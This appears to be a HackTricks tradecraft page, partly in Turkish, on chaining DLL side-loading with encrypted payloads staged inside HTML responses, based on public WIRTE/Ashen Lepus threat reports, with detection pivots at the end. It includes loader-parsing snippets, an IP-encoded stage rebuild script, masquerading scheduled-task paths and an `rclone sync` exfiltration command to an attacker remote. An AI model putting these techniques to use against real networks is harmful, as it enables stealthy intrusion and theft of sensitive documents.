# Advanced DLL Side-Loading With HTML-Embedded Payload Staging

{{#include ../../../banners/hacktricks-training.md}}

## Tradecraft Overview

Ashen Lepus (aka WIRTE), Orta Doğu diplomatik ağları içinde kalıcılık sağlamak için DLL sideloading, staged HTML payloads ve modüler .NET backdoor’ları zincirleyen tekrarlanabilir bir pattern’i weaponized etti. Bu technique, aşağıdakilere dayandığı için herhangi bir operator tarafından yeniden kullanılabilir:

- **Archive-based social engineering**: zararsız görünen PDF’ler, hedeflere bir file-sharing site’dan bir RAR archive indirmeleri için talimat verir. Archive; gerçekçi görünen bir document viewer EXE, güvenilir bir library’nin adıyla adlandırılmış malicious bir DLL (ör. `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`) ve bir decoy `Document.pdf` içerir.
- **DLL search order abuse**: victim EXE’ye çift tıklar, Windows DLL import’unu current directory’den çözer ve malicious loader (AshenLoader) trusted process içinde çalışırken decoy PDF açılır ve şüphe çekilmez.
- **Living-off-the-land staging**: sonraki her stage (AshenStager → AshenOrchestrator → modules) ihtiyaç duyulana kadar disk üzerinde tutulmaz; bunun yerine zararsız görünen HTML responses içine gizlenmiş encrypted blob’lar olarak teslim edilir.

## Multi-Stage Side-Loading Chain

1. **Decoy EXE → AshenLoader**: EXE, AshenLoader’ı side-load eder; bu component host reconnaissance yapar, AES-CTR ile encrypt eder ve `token=`, `id=`, `q=`, veya `auth=` gibi dönen parameters içinde, API benzeri paths’e (örn. `/api/v2/account`) POST eder.
2. **HTML extraction**: C2, yalnızca client IP target region’a geolocate olduğunda ve `User-Agent` implant ile eşleştiğinde sonraki stage’i ele verir; böylece sandboxes boşa düşürülür. Kontroller geçilince HTTP body, Base64/AES-CTR encrypted AshenStager payload’ını içeren bir `<headerp>...</headerp>` blob’u barındırır.
3. **Second sideload**: AshenStager, `wtsapi32.dll` import eden başka bir legitimate binary ile deploy edilir. Binary içine enjekte edilen malicious copy daha fazla HTML fetch eder; bu kez AshenOrchestrator’ı geri kazanmak için `<article>...</article>` kısmını çıkarır.
4. **AshenOrchestrator**: Base64 JSON config’i decode eden modüler bir .NET controller. Config’in `tg` ve `au` field’ları AES key’i oluşturmak için birleştirilir/hashed edilir; bu key `xrk`’yi decrypt eder. Ortaya çıkan bytes, sonrasında fetch edilen her module blob’u için bir XOR key olarak davranır.
5. **Module delivery**: her module, parser’ı keyfi bir tag’e yönlendiren HTML comments üzerinden tanımlanır; bu da yalnızca `<headerp>` veya `<article>` arayan statik rules’u bozar. Modules arasında persistence (`PR*`), uninstallers (`UN*`), reconnaissance (`SN`), screen capture (`SCT`) ve file exploration (`FE`) bulunur.

### HTML Container Parsing Pattern
```csharp
var tag = Regex.Match(html, "<!--\s*TAG:\s*<(.*?)>\s*-->").Groups[1].Value;
var base64 = Regex.Match(html, $"<{tag}>(.*?)</{tag}>", RegexOptions.Singleline).Groups[1].Value;
var aesBytes = AesCtrDecrypt(Convert.FromBase64String(base64), key, nonce);
var module = XorBytes(aesBytes, xorKey);
LoadModule(JsonDocument.Parse(Encoding.UTF8.GetString(module)));
```
Savunucular belirli bir elementi engellese veya kaldırsalar bile, operatörün teslimatı sürdürmek için yalnızca HTML yorumunda ipucu verilen etiketi değiştirmesi yeterlidir.

### Quick Extraction Helper (Python)
```python
import base64, re, requests

html = requests.get(url, headers={"User-Agent": ua}).text
tag = re.search(r"<!--\s*TAG:\s*<(.*?)>\s*-->", html, re.I).group(1)
b64 = re.search(fr"<{tag}>(.*?)</{tag}>", html, re.S | re.I).group(1)
blob = base64.b64decode(b64)
# decrypt blob with AES-CTR, then XOR if required
```
## HTML Staging Evasion Parallels

Recent HTML smuggling research (Talos) highlights payloads hidden as Base64 strings inside `<script>` blocks in HTML attachments and decoded via JavaScript at runtime. The same trick can be reused for C2 responses: stage encrypted blobs inside a script tag (or other DOM element) and decode them in-memory before AES/XOR, making the page look like ordinary HTML. Talos also shows layered obfuscation (identifier renaming plus Base64/Caesar/AES) inside script tags, which maps cleanly to HTML-staged C2 blobs. A later Talos writeup on **hidden text salting** is also relevant here: splitting Base64 with irrelevant HTML comments or whitespace is enough to break simple regex extractors while keeping browser-side reconstruction trivial.

## Recent Variant Notes (2024-2025)

- Check Point observed WIRTE campaigns in 2024 that still hinged on archive-based sideloading but used `propsys.dll` (stagerx64) as the first stage. The stager decodes the next payload with Base64 + XOR (key `53`), sends HTTP requests with a hardcoded `User-Agent`, and extracts encrypted blobs embedded between HTML tags. In one branch, the stage was reconstructed from a long list of embedded IP strings decoded via `RtlIpv4StringToAddressA`, then concatenated into the payload bytes.
- OWN-CERT documented earlier WIRTE tooling where the side-loaded `wtsapi32.dll` dropper protected strings with Base64 + TEA and used the DLL name itself as the decryption key, then XOR/Base64-obfuscated host identification data before sending it to the C2.

## Reconstructing IP-Encoded Stages

WIRTE's 2024 `propsys.dll` branch shows that the next PE does not need to live as one contiguous HTML blob. The loader can stash stage bytes as dotted-quad strings and rebuild them with `RtlIpv4StringToAddressA`, a pattern closely related to Hive's **IPfuscation** tradecraft. Operationally this is useful when the actor wants the HTML page to contain what looks like harmless IOCs or config data instead of an obvious Base64 payload.
```python
import pathlib, re, socket

text = pathlib.Path("stage.txt").read_text(encoding="utf-8")
ips = re.findall(r'((?:\d{1,3}\.){3}\d{1,3})', text)
blob = b"".join(socket.inet_aton(ip) for ip in ips)
pathlib.Path("stage.bin").write_bytes(blob)
```
If the recovered bytes begin with `MZ`, you likely reconstructed the next PE directly. If not, check for a leading XOR/Base64 layer or small delimiter chunks between addresses.

## Swappable DLL Names & Host Rotation

Bu pattern’in güçlü bir özelliği, **HTML/AES/XOR staging backend’in aynı kalabilmesi, yalnızca sideload pair’in değişmesidir**. WIRTE, kampanyalar boyunca `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll` ve `propsys.dll` arasında rotasyon yaptı; bu faydalıdır çünkü:

- `propsys.dll` ve `wtsapi32.dll`, defenders’ın `%System32%` / `%SysWOW64%` içinde bulunmasını beklediği sıradan Windows DLL isimleridir.
- **HijackLibs** gibi public catalog’lar, bu DLL isimlerini kopyalanmış bir application directory’den yükleyecek birçok binary’yi zaten eşleştirir; bu da operatörlere stager’i yeniden tasarlamadan replacement host sağlar.
- Sadece export surface, host başına uyarlanmalıdır. HTML parser, AES/XOR rutinleri ve module loader genellikle değiştirilmeden bir forwarding proxy DLL’e taşınabilir.

Offensive lab çalışmaları için bu, problemi **(1) seçtiğiniz DLL adını local olarak resolve eden stabil signed bir host bulmak** ve **(2) aynı staged-HTML loader logic’i o DLL’in arkasında yeniden kullanmak** şeklinde ayırabileceğiniz anlamına gelir.

## Crypto & C2 Hardening

- **AES-CTR everywhere**: current loaders embed 256-bit keys plus nonces (e.g., `{9a 20 51 98 ...}`) and optionally add an XOR layer using strings such as `msasn1.dll` before/after decryption.
- **Key material variations**: earlier loaders used Base64 + TEA to protect embedded strings, with the decryption key derived from the malicious DLL name (e.g., `wtsapi32.dll`).
- **Infrastructure split + subdomain camouflage**: staging servers are separated per tool, hosted across varying ASNs, and sometimes fronted by legitimate-looking subdomains, so burning one stage doesn't expose the rest.
- **Recon smuggling**: enumerated data now includes Program Files listings to spot high-value apps and is always encrypted before it leaves the host.
- **URI churn**: query parameters and REST paths rotate between campaigns (`/api/v1/account?token=` → `/api/v2/account?auth=`), invalidating brittle detections.
- **User-Agent pinning + safe redirects**: C2 infrastructure responds only to exact UA strings and otherwise redirects to benign news/health sites to blend in.
- **Gated delivery**: servers are geo-fenced and only answer real implants. Unapproved clients receive unsuspicious HTML.

## Persistence & Execution Loop

AshenStager, Windows bakım işleri gibi görünen ve `svchost.exe` üzerinden çalışan scheduled tasks bırakır; örn.:

- `C:\Windows\System32\Tasks\Windows\WindowsDefenderUpdate\Windows Defender Updater`
- `C:\Windows\System32\Tasks\Windows\WindowsServicesUpdate\Windows Services Updater`
- `C:\Windows\System32\Tasks\Automatic Windows Update`

Bu görevler, boot sırasında veya belirli aralıklarla sideloading chain’i yeniden başlatır; böylece AshenOrchestrator, diske tekrar dokunmadan yeni modules talep edebilir.

## Using Benign Sync Clients for Exfiltration

Operatörler diplomatik belgeleri dedicated bir module üzerinden `C:\Users\Public` içine stage eder (dünyadan okunabilir ve şüpheli değildir), ardından o dizini attacker storage ile senkronize etmek için legit [Rclone](https://rclone.org/) binary’sini indirir. Unit42, bunun bu actor’ün exfiltration için Rclone kullandığının ilk gözlemi olduğunu ve normal traffic içine karışmak için legit sync tooling’i kötüye kullanma yönündeki daha geniş trend ile uyumlu olduğunu belirtiyor:

1. **Stage**: hedef dosyaları `C:\Users\Public\{campaign}\` içine kopyala/topla.
2. **Configure**: attacker-controlled bir HTTPS endpoint’i gösteren Rclone config gönder (örn. `api.technology-system[.]com`).
3. **Sync**: `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet` çalıştır; böylece traffic normal cloud backup gibi görünür.

Rclone, legit backup workflows için yaygın kullanıldığı için defenders anormal executions’a odaklanmalıdır (yeni binaries, garip remotes veya `C:\Users\Public` içinden ani sync işlemleri).

## Detection Pivots

- Kullanıcı tarafından yazılabilir path’lerden beklenmedik şekilde DLL yükleyen **signed processes** için alarm üretin (Procmon filters + `Get-ProcessMitigation -Module`), özellikle DLL isimleri `netutils`, `srvcli`, `dwampi`, `wtsapi32` veya `propsys` ile örtüşüyorsa.
- Şüpheli HTTPS responses içinde **alışılmadık tag’lerin içine gömülü büyük Base64 blob’lar** veya `<!-- TAG: <xyz> -->` yorumlarıyla korunmuş içerik olup olmadığını inceleyin.
- Önce HTML’yi normalleştirin: **Base64 extraction’dan önce comments’i temizleyin ve whitespace’i sıkıştırın**, çünkü hidden-text-salting tarzı evasion payload’ları comment sınırlarına bölebilir.
- HTML hunting’i, JavaScript tarafından AES/XOR processing öncesi decode edilen **`<script>` blokları içindeki Base64 strings** için de genişletin (HTML smuggling-style staging).
- Özellikle çevredeki strings gerçek network targets yerine uzun IPv4 listeleri olduğunda, **`RtlIpv4StringToAddressA` çağrılarının ardından buffer assembly** tekrarlarını arayın.
- `svchost.exe`’yi non-service arguments ile çalıştıran veya dropper directories’e geri işaret eden **scheduled tasks** için avlanın.
- Yalnızca tam `User-Agent` strings için payload döndüren ve aksi halde legit news/health domains’e yönlenen **C2 redirects**’i takip edin.
- IT-managed location’lar dışında görünen **Rclone** binaries, yeni `rclone.conf` dosyaları veya `C:\Users\Public` gibi staging directories’den çeken sync jobs için izleme yapın.

## References

- [Hamas-Affiliated Ashen Lepus Targets Middle Eastern Diplomatic Entities With New AshTag Malware Suite](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- [Hidden between the tags: Insights into evasion techniques in HTML smuggling](https://blog.talosintelligence.com/hidden-between-the-tags-insights-into-evasion-techniques-in-html-smuggling/)
- [Hamas-affiliated Threat Actor WIRTE Continues its Middle East Operations and Moves to Disruptive Activity](https://research.checkpoint.com/2024/hamas-affiliated-threat-actor-expands-to-disruptive-activity/)
- [WIRTE: In Search of Lost Time](https://www.own.security/en/ressources/blog/wirte-analyse-campagne-cyber-own-cert)
- [Hive Ransomware Deploys Novel IPfuscation Technique To Avoid Detection](https://www.sentinelone.com/blog/hive-ransomware-deploys-novel-ipfuscation-technique/)
- [Potential System DLL Sideloading From Non System Locations](https://detection.fyi/sigmahq/sigma/windows/image_load/image_load_side_load_from_non_system_location/)
{{#include ../../../banners/hacktricks-training.md}}
